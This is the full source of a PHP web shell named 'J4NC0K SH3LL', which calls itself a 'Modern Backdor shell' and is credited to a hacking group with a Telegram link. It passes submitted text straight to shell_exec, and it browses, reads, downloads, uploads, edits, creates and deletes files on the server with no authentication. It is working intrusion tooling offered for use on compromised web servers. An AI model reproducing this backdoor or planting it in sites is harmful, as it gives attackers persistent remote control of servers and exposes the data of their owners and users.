/*

Hi who are you, thank you for using this shell, don't forget to join our group..

**************************************************
**************************************************
**************************************************
**************************************************
**************************************************
********** 𝘼𝙪𝙩𝙤𝙧: Mr.222 Xpl01T     ***************
********** 𝘿𝙖𝙩𝙚: December 14, 2025  **************
********** 𝙇𝙖𝙜𝙜𝙪𝙖𝙜𝙚: Php.           **************
********** 𝙊𝙥𝙚𝙣 𝙎𝙤𝙪𝙧𝙘𝙚: Yes        ***************
********** 𝙏𝙝𝙖𝙣𝙠𝙨 𝙩𝙤: Me And Member ***************
**************************************************
**************************************************
**************************************************
**************************************************


*/
<?php
$logo = "https://files.catbox.moe/qsusza.gif";
$title = "J4NC0K SH3LL";
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if($current_dir === false) $current_dir = getcwd();

if(isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd'] . ' 2>&1');
}

if(isset($_GET['action'])) {
    if($_GET['action'] == 'delete' && isset($_GET['file'])) {
        $file = realpath($_GET['file']);
        if($file && file_exists($file)) {
            if(is_dir($file)) {
                rmdir($file);
            } else {
                unlink($file);
            }
        }
        header("Location: ?dir=" . urlencode($current_dir));
        exit;
    }
    
    if($_GET['action'] == 'download' && isset($_GET['file'])) {
        $file = realpath($_GET['file']);
        if($file && file_exists($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            readfile($file);
            exit;
        }
    }
    
    if($_GET['action'] == 'view' && isset($_GET['file'])) {
        $file = realpath($_GET['file']);
        if($file && file_exists($file)) {
            header('Content-Type: text/plain');
            readfile($file);
            exit;
        }
    }
    
    if($_GET['action'] == 'phpinfo') {
        phpinfo();
        exit;
    }
}

if(isset($_POST['save']) && isset($_POST['filename']) && isset($_POST['content'])) {
    $filename = realpath($_POST['filename']) ?: $_POST['filename'];
    file_put_contents($filename, $_POST['content']);
    header("Location: ?dir=" . urlencode(dirname($filename)));
    exit;
}

if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $target = $current_dir . '/' . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        header("Location: ?dir=" . urlencode($current_dir));
        exit;
    }
}

if(isset($_POST['create']) && isset($_POST['newfilename'])) {
    $fullpath = $current_dir . '/' . $_POST['newfilename'];
    $content = $_POST['newcontent'] ?? '';
    file_put_contents($fullpath, $content);
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title><?php echo $title; ?></title>
<meta charset="UTF-8">
<style>
* { 
    margin: 0; 
    padding: 0; 
    box-sizing: border-box; 
    font-family: 'Segoe UI', system-ui, sans-serif; 
}
body { 
    background: #1a0f0f; 
    color: #e0c0c0; 
    padding: 15px;
    line-height: 1.5;
    min-height: 100vh;
}
.container { 
    max-width: 1200px; 
    margin: 0 auto;
    background: rgba(25, 15, 15, 0.8);
    border-radius: 10px;
    padding: 20px;
    box-shadow: 0 5px 20px rgba(150, 50, 50, 0.1);
}
.header { 
    text-align: center; 
    margin-bottom: 25px; 
    padding-bottom: 20px; 
    border-bottom: 1px solid rgba(200, 100, 100, 0.2); 
}
.logo { 
    width: 170px; 
    height: 170px; 
    border-radius: 10px;
    border: 2px solid #e67e7e;
    box-shadow: 0 0 15px rgba(230, 126, 126, 0.3);
}
h2 { 
    color: #e67e7e; 
    margin: 15px 0 10px; 
    font-weight: 300;
    font-size: 24px;
    letter-spacing: 1px;
}
.path { 
    background: rgba(40, 20, 20, 0.7); 
    padding: 12px 15px; 
    margin-bottom: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3); 
    border-radius: 6px;
    font-size: 14px;
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    gap: 5px;
}
.path a { 
    color: #e67e7e; 
    text-decoration: none; 
    padding: 3px 8px;
    border-radius: 4px;
}
.path a:hover { 
    color: #ff9999; 
    background: rgba(230, 126, 126, 0.1);
}
.toolbar { 
    background: rgba(40, 20, 20, 0.7); 
    padding: 12px; 
    margin-bottom: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3);
    border-radius: 6px;
    display: flex; 
    gap: 10px; 
    flex-wrap: wrap; 
}
.toolbar input, .toolbar button { 
    padding: 8px 15px; 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    background: rgba(60, 30, 30, 0.8); 
    color: #e0c0c0; 
    border-radius: 5px;
    font-size: 14px;
}
.toolbar button { 
    cursor: pointer;
    background: linear-gradient(135deg, rgba(150, 60, 60, 0.8), rgba(120, 40, 40, 0.8));
}
.toolbar button:hover { 
    background: linear-gradient(135deg, rgba(180, 80, 80, 0.9), rgba(140, 50, 50, 0.9));
    color: #ffcccc; 
    border-color: #e67e7e;
}
.file-table { 
    width: 100%; 
    border-collapse: collapse; 
    margin-bottom: 25px;
    border-radius: 6px;
    overflow: hidden;
}
.file-table th { 
    background: linear-gradient(135deg, rgba(100, 40, 40, 0.9), rgba(80, 30, 30, 0.9));
    padding: 12px 15px; 
    text-align: left; 
    border: 1px solid rgba(200, 100, 100, 0.3); 
    color: #e0c0c0; 
    font-weight: 400;
    font-size: 13px;
}
.file-table td { 
    padding: 10px 15px; 
    border: 1px solid rgba(200, 100, 100, 0.2); 
    font-size: 13px;
}
.file-table tr:nth-child(even) { 
    background: rgba(50, 25, 25, 0.3); 
}
.file-table tr:hover { 
    background: rgba(230, 126, 126, 0.08); 
}
.file-table a { 
    color: #e67e7e; 
    text-decoration: none; 
    font-size: 12px; 
    margin-right: 8px;
    padding: 3px 8px;
    border-radius: 3px;
}
.file-table a:hover { 
    color: #ff9999; 
    background: rgba(230, 126, 126, 0.1);
}
.cmd-form { 
    background: rgba(40, 20, 20, 0.7); 
    padding: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3);
    border-radius: 6px;
    margin-bottom: 20px; 
}
.cmd-form input[type="text"] { 
    width: 350px; 
    padding: 10px; 
    background: rgba(60, 30, 30, 0.8); 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    color: #e0c0c0; 
    border-radius: 5px;
    font-size: 14px;
}
.cmd-form input[type="submit"] { 
    padding: 10px 20px; 
    background: linear-gradient(135deg, rgba(150, 60, 60, 0.8), rgba(120, 40, 40, 0.8));
    border: 1px solid rgba(200, 100, 100, 0.4); 
    color: #e0c0c0; 
    cursor: pointer;
    border-radius: 5px;
    font-size: 14px;
}
.cmd-form input[type="submit"]:hover { 
    background: linear-gradient(135deg, rgba(180, 80, 80, 0.9), rgba(140, 50, 50, 0.9));
    color: #ffcccc;
}
.output { 
    background: rgba(30, 15, 15, 0.8); 
    padding: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3);
    border-radius: 6px;
    color: #e0c0c0; 
    white-space: pre-wrap; 
    max-height: 300px; 
    overflow-y: auto; 
    margin-bottom: 20px;
    font-family: 'Consolas', monospace;
    font-size: 13px;
}
.modal { 
    display: none; 
    position: fixed; 
    top: 0; 
    left: 0; 
    width: 100%; 
    height: 100%; 
    background: rgba(10, 5, 5, 0.85); 
    z-index: 1000;
}
.modal-content { 
    position: absolute; 
    top: 50%; 
    left: 50%; 
    transform: translate(-50%, -50%); 
    background: rgba(40, 20, 20, 0.95); 
    padding: 25px; 
    border: 1px solid rgba(230, 126, 126, 0.4);
    border-radius: 10px;
    width: 90%; 
    max-width: 800px; 
}
.modal textarea { 
    width: 100%; 
    height: 400px; 
    background: rgba(30, 15, 15, 0.8); 
    color: #e0c0c0; 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    padding: 15px; 
    font-family: 'Consolas', monospace; 
    resize: vertical;
    border-radius: 5px;
    font-size: 13px;
}
.modal input[type="text"] { 
    width: 100%; 
    padding: 10px; 
    margin-bottom: 15px; 
    background: rgba(30, 15, 15, 0.8); 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    color: #e0c0c0; 
    border-radius: 5px;
}
.about-content { 
    color: #e0c0c0; 
    line-height: 1.6; 
    font-size: 14px; 
    padding: 10px 0;
}
.about-content h3 { 
    color: #e67e7e; 
    margin-bottom: 20px; 
    font-weight: 300;
    font-size: 20px;
    text-align: center;
}
.about-content p { 
    margin-bottom: 12px; 
    padding-left: 10px;
    border-left: 2px solid rgba(230, 126, 126, 0.3);
}
.about-content a { 
    color: #e67e7e; 
    text-decoration: none; 
    border-bottom: 1px dashed rgba(230, 126, 126, 0.5);
}
.about-content a:hover { 
    color: #ff9999; 
}
.footer {
    text-align: center;
    padding: 20px 0 10px;
    color: #996666;
    font-size: 12px;
    border-top: 1px solid rgba(200, 100, 100, 0.1);
    margin-top: 20px;
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <img src="<?php echo $logo; ?>" class="logo" alt="Logo">
        <h2><?php echo $title; ?></h2>
        <div style="color:#b88; font-size:13px;">
            <?php echo trim(shell_exec('whoami')) . '@' . gethostname() . ' | PHP ' . phpversion(); ?>
        </div>
    </div>

    <div class="path">
        📁
        <?php
        $parts = explode('/', trim($current_dir, '/'));
        $path = '';
        foreach($parts as $i => $part) {
            if($part == '') continue;
            $path .= ($path ? '/' : '') . $part;
            echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>/';
        }
        ?>
        <span style="color:#e67e7e; font-size:13px; margin-left:10px;">
            (<?php echo is_dir($current_dir) ? count(scandir($current_dir))-2 : 0; ?> items)
        </span>
    </div>

    <div class="toolbar">
        <form method="GET" style="display:flex;gap:10px;flex:1;">
            <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Enter path...">
            <button type="submit">Go</button>
        </form>
        <button onclick="showModal('upload')">📤 Upload</button>
        <button onclick="showModal('newfile')">📝 New File</button>
        <button onclick="showModal('about')">ℹ️ About</button>
        <button onclick="window.open('?action=phpinfo', '_blank')">⚙️ PHP Info</button>
    </div>

    <table class="file-table">
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
        </tr>
        <?php
        if($current_dir != '/' && $current_dir != '') {
            $parent = dirname($current_dir);
            if($parent != $current_dir) {
                echo '<tr>
                    <td><a href="?dir=' . urlencode($parent) . '">📁 ..</a></td>
                    <td>-</td>
                    <td>-</td>
                    <td><a href="?dir=' . urlencode($parent) . '">Open</a></td>
                </tr>';
            }
        }
        
        if(is_dir($current_dir)) {
            $files = scandir($current_dir);
            usort($files, function($a, $b) use ($current_dir) {
                $a_is_dir = is_dir($current_dir . '/' . $a);
                $b_is_dir = is_dir($current_dir . '/' . $b);
                if($a_is_dir && !$b_is_dir) return -1;
                if(!$a_is_dir && $b_is_dir) return 1;
                return strcasecmp($a, $b);
            });
            
            foreach($files as $file) {
                if($file == '.' || $file == '..') continue;
                
                $fullpath = $current_dir . '/' . $file;
                $is_dir = is_dir($fullpath);
                $size = $is_dir ? '-' : format_size(filesize($fullpath));
                $modified = date('Y-m-d H:i', filemtime($fullpath));
                
                echo '<tr>';
                echo '<td>';
                if($is_dir) {
                    echo '<a href="?dir=' . urlencode($fullpath) . '">📁 ' . htmlspecialchars($file) . '</a>';
                } else {
                    echo '📄 ' . htmlspecialchars($file);
                }
                echo '</td>';
                echo '<td>' . $size . '</td>';
                echo '<td>' . $modified . '</td>';
                echo '<td>';
                
                if($is_dir) {
                    echo '<a href="?dir=' . urlencode($fullpath) . '">Open</a> ';
                    echo '<a href="?action=delete&file=' . urlencode($fullpath) . '&dir=' . urlencode($current_dir) . '" onclick="return confirm(\'Delete folder ' . htmlspecialchars($file) . '?\')">Delete</a>';
                } else {
                    echo '<a href="#" onclick="editFile(\'' . addslashes($fullpath) . '\')">Edit</a> ';
                    echo '<a href="?action=view&file=' . urlencode($fullpath) . '" target="_blank">View</a> ';
                    echo '<a href="?action=download&file=' . urlencode($fullpath) . '">Download</a> ';
                    echo '<a href="?action=delete&file=' . urlencode($fullpath) . '&dir=' . urlencode($current_dir) . '" onclick="return confirm(\'Delete file ' . htmlspecialchars($file) . '?\')">Delete</a>';
                }
                
                echo '</td>';
                echo '</tr>';
            }
        } else {
            echo '<tr><td colspan="4" style="text-align:center;color:#e67e7e;padding:25px;font-size:14px;">📁 Directory not found</td></tr>';
        }
        ?>
    </table>

    <form method="POST" class="cmd-form">
        <span style="color:#e67e7e;">$</span>
        <input type="text" name="cmd" placeholder="Enter command...">
        <input type="submit" value="Execute">
    </form>

    <?php if(isset($output)): ?>
    <div class="output">
        <strong style="color:#e67e7e;">$ <?php echo htmlspecialchars($_POST['cmd']); ?></strong><br><br>
        <?php echo htmlspecialchars($output); ?>
    </div>
    <?php endif; ?>

    <div class="footer">
        J4NC0K SH3LL © <?php echo date('Y'); ?> | Simple & Powerful Backdor
    </div>
</div>

<div id="uploadModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:15px;">📤 Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" style="width:100%;margin-bottom:15px;color:#e0c0c0;padding:10px;background:rgba(30,15,15,0.8);border:1px solid rgba(200,100,100,0.4);border-radius:5px;">
            <div style="display:flex;gap:10px;">
                <button type="submit" style="padding:10px 20px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;cursor:pointer;flex:1;border-radius:5px;">Upload</button>
                <button type="button" onclick="hideModal('upload')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:15px;">✏️ Edit File</h3>
        <form method="POST">
            <input type="hidden" name="filename" id="edit_filename">
            <textarea name="content" id="edit_content"></textarea>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="save" style="padding:10px 20px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;cursor:pointer;flex:1;border-radius:5px;">Save</button>
                <button type="button" onclick="hideModal('edit')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="newfileModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:15px;">📝 Create New File</h3>
        <form method="POST">
            <input type="text" name="newfilename" placeholder="Filename (e.g., newfile.txt)" style="width:100%;margin-bottom:15px;padding:10px;background:rgba(30,15,15,0.8);border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;border-radius:5px;">
            <textarea name="newcontent" placeholder="Content (optional)" style="height:300px;"></textarea>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="create" style="padding:10px 20px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;cursor:pointer;flex:1;border-radius:5px;">Create</button>
                <button type="button" onclick="hideModal('newfile')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="aboutModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:20px;">ℹ️ About J4NC0K SH3LL</h3>
        <div class="about-content">
            <p><strong>Name:</strong> J4NC0K SH3LL</p>
            <p><strong>Creator:</strong> Mr.222 Xpl01T</p>
            <p><strong>Team:</strong> Death Of Father & AG-SEC</p>
            <p><strong>Date:</strong> December 14, 2025</p>
            <p><strong>Version:</strong> 1.0</p>
            <p><strong>Description:</strong> Modern Backdor shell</p>
            <p style="text-align:center;margin:25px 0;">
                <a href="https://t.me/+PR8AQcj0Tos3YTll" target="_blank" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(230,126,126,0.5);color:#ffcccc;text-decoration:none;border-radius:5px;font-size:14px;">
                    Join Our Telegram Channel
                </a>
            </p>
            <p style="color:#996666;font-size:12px;text-align:center;margin-top:20px;">
                Use responsibly. We Are Party At Your Securiry.
            </p>
        </div>
        <div style="display:flex;gap:10px;margin-top:25px;">
            <button type="button" onclick="hideModal('about')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Close</button>
        </div>
    </div>
</div>

<script>
function showModal(type) {
    document.getElementById(type + 'Modal').style.display = 'block';
}

function hideModal(type) {
    document.getElementById(type + 'Modal').style.display = 'none';
}

function editFile(filename) {
    fetch('?action=view&file=' + encodeURIComponent(filename))
        .then(response => response.text())
        .then(content => {
            document.getElementById('edit_filename').value = filename;
            document.getElementById('edit_content').value = content;
            showModal('edit');
        })
        .catch(error => {
            alert('Error loading file: ' + error);
        });
}

window.onclick = function(event) {
    if(event.target.className === 'modal') {
        event.target.style.display = 'none';
    }
}
</script>
</body>
</html>
<?php
function format_size($bytes) {
    if($bytes < 1024) return $bytes . ' B';
    if($bytes < 1048576) return round($bytes/1024, 1) . ' KB';
    if($bytes < 1073741824) return round($bytes/1048576, 1) . ' MB';
    return round($bytes/1073741824, 1) . ' GB';
}
?>